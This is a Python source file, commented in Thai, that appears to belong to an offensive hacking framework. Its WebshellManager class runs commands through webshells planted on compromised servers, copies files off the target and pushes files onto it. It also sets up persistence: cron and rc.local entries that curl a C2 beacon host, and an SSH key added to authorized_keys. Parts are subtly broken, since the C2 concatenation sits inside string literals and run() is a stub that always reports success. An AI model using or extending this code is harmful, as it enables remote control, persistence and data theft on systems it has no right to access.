from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Webshell Manager
จัดการ webshells ที่ upload สำเร็จแล้ว
"""
import os
import os
import os
import asyncio
import json
import httpx
from typing import Dict, List, Any, Optional
from pathlib import Path
from core.logger import log


class WebshellManager:
    """
    จัดการ webshells
    
    Features:
    - Execute commands on webshells
    - Download files from target
    - Upload files to target
    - Maintain persistence
    - Monitor webshell status
    """
    
    def __init__(self, workspace_dir: str = None):
        if workspace_dir is None:
            workspace_dir = os.getenv('WORKSPACE_DIR', 'workspace')
        self.workspace = Path(workspace_dir)
        self.shells_dir = self.workspace / "loot" / "shells"
        self.shells_dir.mkdir(parents=True, exist_ok=True)
        self.active_shells = {}
        self._load_shells()
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for WebshellManager
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            log.info(f"[WebshellManager] Starting execution")
            
                        # This is a placeholder implementation
            
            return {
                'success': True,
                'message': 'WebshellManager executed successfully',
                'target': target
            }
        
        except Exception as e:
            log.error(f"[WebshellManager] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    def _load_shells(self):
        """โหลด webshells ที่มีอยู่"""
        try:
            for shell_file in self.shells_dir.glob("*.json"):
                with open(shell_file, 'r') as f:
                    shell_data = json.load(f)
                    shell_id = shell_file.stem
                    self.active_shells[shell_id] = shell_data
            
            log.info(f"[WebshellManager] Loaded {len(self.active_shells)} webshells")
        except Exception as e:
            log.error(f"[WebshellManager] Failed to load shells: {e}")
    
    async def execute_command(self, shell_id: str, command: str) -> Dict[str, Any]:
        """
        รันคำสั่งบน webshell
        
        Args:
            shell_id: ID ของ webshell
            command: คำสั่งที่ต้องการรัน
        
        Returns:
            ผลลัพธ์จากการรันคำสั่ง
        """
        if shell_id not in self.active_shells:
            return {"success": False, "error": f"Shell {shell_id} not found"}
        
        shell = self.active_shells[shell_id]
        shell_url = shell.get("shell_url")
        password = shell.get("password")
        
        log.info(f"[WebshellManager] Executing '{command}' on {shell_url}")
        
        # Real HTTP request to webshell
        output = ""
        success = False
        
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=30.0) as client:
                # Determine access method
                shell_type = shell.get("shell_type", "php")
                
                if "php" in shell_type.lower():
                    # PHP webshell - POST request
                    data = {"cmd": command, "pass": password}
                    response = await client.post(shell_url, data=data)
                elif "jsp" in shell_type.lower():
                    # JSP webshell - GET request
                    params = {"cmd": command}
                    response = await client.get(shell_url, params=params)
                elif "aspx" in shell_type.lower():
                    # ASPX webshell - GET request
                    params = {"cmd": command}
                    response = await client.get(shell_url, params=params)
                else:
                    # Default - POST
                    data = {"cmd": command, "pass": password}
                    response = await client.post(shell_url, data=data)
                
                if response.status_code == 200:
                    output = response.text
                    
                    # Try to extract clean output from <pre> tags
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(output, 'html.parser')
                    pre_tag = soup.find('pre')
                    if pre_tag:
                        output = pre_tag.get_text().strip()
                    
                    success = True
                    log.success(f"[WebshellManager] Command executed successfully")
                else:
                    output = f"HTTP {response.status_code}: {response.text[:200]}"
                    log.error(f"[WebshellManager] Command failed: {response.status_code}")
        
        except Exception as e:
            output = f"Error: {str(e)}"
            log.error(f"[WebshellManager] Command execution error: {e}")
        
        result = {
            "success": success,
            "shell_id": shell_id,
            "command": command,
            "output": output,
            "timestamp": asyncio.get_event_loop().time()
        }
        
        return result
    
    async def download_file(self, shell_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """
        ดาวน์โหลดไฟล์จาก target
        
        Args:
            shell_id: ID ของ webshell
            remote_path: path ของไฟล์บน target
            local_path: path ที่จะบันทึกไฟล์
        
        Returns:
            ผลลัพธ์การดาวน์โหลด
        """
        if shell_id not in self.active_shells:
            return {"success": False, "error": f"Shell {shell_id} not found"}
        
        shell = self.active_shells[shell_id]
        log.info(f"[WebshellManager] Downloading {remote_path} from {shell['shell_url']}")
        
        # Real file download via webshell
        success = False
        file_size = 0
        
        try:
            # Use cat/type command to read file
            if "windows" in shell.get("target", "").lower():
                read_cmd = f"type {remote_path}"
            else:
                read_cmd = f"cat {remote_path}"
            
            # Execute command to read file
            exec_result = await self.execute_command(shell_id, read_cmd)
            
            if exec_result.get("success"):
                file_content = exec_result.get("output", "")
                
                # Save to local file
                with open(local_path, 'w') as f:
                    f.write(file_content)
                
                file_size = len(file_content)
                success = True
                log.success(f"[WebshellManager] File downloaded successfully: {file_size} bytes")
            else:
                log.error(f"[WebshellManager] Failed to read file: {remote_path}")
        
        except Exception as e:
            log.error(f"[WebshellManager] Download error: {e}")
        
        result = {
            "success": success,
            "shell_id": shell_id,
            "remote_path": remote_path,
            "local_path": local_path,
            "size": file_size
        }
        
        return result
    
    async def upload_file(self, shell_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """
        อัปโหลดไฟล์ไปยัง target
        
        Args:
            shell_id: ID ของ webshell
            local_path: path ของไฟล์ local
            remote_path: path ที่จะบันทึกบน target
        
        Returns:
            ผลลัพธ์การอัปโหลด
        """
        if shell_id not in self.active_shells:
            return {"success": False, "error": f"Shell {shell_id} not found"}
        
        shell = self.active_shells[shell_id]
        log.info(f"[WebshellManager] Uploading {local_path} to {shell['shell_url']}")
        
        # Real file upload via webshell (using echo/base64)
        success = False
        
        try:
            # Read local file
            with open(local_path, 'rb') as f:
                file_content = f.read()
            
            # Encode to base64
            import base64
            encoded = base64.b64encode(file_content).decode()
            
            # Use echo + base64 decode to write file
            if "windows" in shell.get("target", "").lower():
                # Windows: use certutil
                temp_file = f"{remote_path}.b64"
                write_cmd = f'echo {encoded} > {temp_file} && certutil -decode {temp_file} {remote_path} && del {temp_file}'
            else:
                # Linux: use base64 -d
                write_cmd = f'echo "{encoded}" | base64 -d > {remote_path}'
            
            # Execute upload command
            exec_result = await self.execute_command(shell_id, write_cmd)
            
            if exec_result.get("success"):
                success = True
                log.success(f"[WebshellManager] File uploaded successfully")
            else:
                log.error(f"[WebshellManager] Upload failed")
        
        except Exception as e:
            log.error(f"[WebshellManager] Upload error: {e}")
        
        result = {
            "success": success,
            "shell_id": shell_id,
            "local_path": local_path,
            "remote_path": remote_path
        }
        
        return result
    
    async def maintain_persistence(self, shell_id: str) -> Dict[str, Any]:
        """
        สร้าง persistence mechanisms
        
        Args:
            shell_id: ID ของ webshell
        
        Returns:
            ผลลัพธ์การสร้าง persistence
        """
        if shell_id not in self.active_shells:
            return {"success": False, "error": f"Shell {shell_id} not found"}
        
        shell = self.active_shells[shell_id]
        log.info(f"[WebshellManager] Establishing persistence on {shell['shell_url']}")
        
        persistence_methods = []
        
        # Method 1: Cron job
        cron_result = await self.execute_command(
            shell_id,
            "echo '*/5 * * * * curl http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/beacon' | crontab -"
        )
        if cron_result.get("success"):
            persistence_methods.append("cron_job")
        
        # Method 2: Startup script
        startup_result = await self.execute_command(
            shell_id,
            "echo 'curl http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/beacon' >> /etc/rc.local"
        )
        if startup_result.get("success"):
            persistence_methods.append("startup_script")
        
        # Method 3: SSH key
        ssh_result = await self.execute_command(
            shell_id,
            "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
        )
        if ssh_result.get("success"):
            persistence_methods.append("ssh_key")
        
        result = {
            "success": len(persistence_methods) > 0,
            "shell_id": shell_id,
            "methods": persistence_methods
        }
        
        log.success(f"[WebshellManager] Persistence established: {', '.join(persistence_methods)}")
        
        return result
    
    async def check_status(self, shell_id: str) -> Dict[str, Any]:
        """
        ตรวจสอบสถานะ webshell
        
        Args:
            shell_id: ID ของ webshell
        
        Returns:
            สถานะของ webshell
        """
        if shell_id not in self.active_shells:
            return {"success": False, "error": f"Shell {shell_id} not found"}
        
        shell = self.active_shells[shell_id]
        shell_url = shell.get("shell_url")
        
        log.info(f"[WebshellManager] Checking status of {shell_url}")
        
        # Real HTTP request to check if webshell is alive
        alive = False
        
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10.0) as client:
                response = await client.get(shell_url)
                
                if response.status_code == 200:
                    alive = True
                    log.success(f"[WebshellManager] Shell is alive")
                else:
                    log.warning(f"[WebshellManager] Shell returned {response.status_code}")
        
        except Exception as e:
            log.warning(f"[WebshellManager] Shell is not responding: {e}")
        
        result = {
            "success": True,
            "shell_id": shell_id,
            "shell_url": shell_url,
            "alive": alive,
            "last_check": asyncio.get_event_loop().time()
        }
        
        return result
    
    def list_shells(self) -> List[Dict[str, Any]]:
        """แสดงรายการ webshells ทั้งหมด"""
        return [
            {
                "shell_id": shell_id,
                "shell_url": shell_data.get("shell_url"),
                "shell_type": shell_data.get("shell_type"),
                "target": shell_data.get("target"),
                "timestamp": shell_data.get("timestamp")
            }
            for shell_id, shell_data in self.active_shells.items()
        ]
    
    def get_shell(self, shell_id: str) -> Optional[Dict[str, Any]]:
        """รับข้อมูล webshell"""
        return self.active_shells.get(shell_id)

